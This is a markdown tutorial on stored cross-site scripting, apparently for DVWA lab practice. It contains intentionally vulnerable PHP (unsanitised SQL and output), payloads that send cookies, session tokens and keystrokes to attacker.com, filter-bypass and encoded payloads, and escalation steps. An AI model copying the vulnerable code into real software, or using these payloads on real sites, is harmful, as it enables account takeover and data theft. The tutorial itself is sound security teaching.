# Stored XSS

## Overview

Stored XSS (Persistent XSS) occurs when malicious scripts are permanently stored on the target server (database, file system, etc.) and later displayed to users without proper sanitization.

## How It Works

1. Attacker submits malicious script through input field
2. Application stores the script in database
3. Victim requests page containing stored data
4. Server sends stored script to victim's browser
5. Browser executes malicious script

## Example Scenario

### Vulnerable Comment System

**Server-Side Code (PHP)**:
```php
<?php
// Storing comment (VULNERABLE)
$comment = $_POST['comment'];
$sql = "INSERT INTO comments (text) VALUES ('$comment')";
mysqli_query($conn, $sql);

// Displaying comments (VULNERABLE)
$result = mysqli_query($conn, "SELECT text FROM comments");
while ($row = mysqli_fetch_assoc($result)) {
    echo $row['text']; // No sanitization!
}
?>
```

**Malicious Payload**:
```html
<script>
  // Steal cookies
  var img = new Image();
  img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
```

## Attack Vectors

### 1. Cookie Stealing
```html
<script>
  fetch('http://attacker.com/log?cookie=' + document.cookie);
</script>
```

### 2. Session Hijacking
```html
<script>
  document.location='http://attacker.com/phish?session=' + sessionStorage.getItem('token');
</script>
```

### 3. Keylogging
```html
<script>
  document.onkeypress = function(e) {
    fetch('http://attacker.com/keys?key=' + e.key);
  }
</script>
```

### 4. Defacement
```html
<script>
  document.body.innerHTML = '<h1>Hacked!</h1>';
</script>
```

### 5. Redirects
```html
<script>
  window.location.href = 'http://malicious-site.com';
</script>
```

## Testing in DVWA

1. Navigate to "XSS (Stored)" section
2. Set security level to "Low"
3. Submit payloads in the message field
4. Observe execution when page reloads

**Test Payloads**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
```

## Advanced Techniques

### Bypassing Filters

If basic `<script>` tags are blocked:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

### Encoding Payloads

```html
<!-- URL Encoding -->
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

<!-- HTML Entities -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- Unicode -->
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

## Exploitation Steps

1. **Identify vulnerable input**: Find forms that store data
2. **Test basic payload**: Submit `<script>alert(1)</script>`
3. **Confirm execution**: Check if alert appears on page load
4. **Escalate**: Replace with cookie stealer or more sophisticated payload
5. **Document**: Screenshot the execution

## Real-World Impact

- **2018 British Airways**: XSS attack led to theft of 380,000 payment cards
- **2019 Fortnite**: XSS vulnerability allowed account takeover
- **Social Media Platforms**: Frequently targeted for stored XSS in profiles/posts

## Mitigation

See `mitigation.md` for prevention techniques.
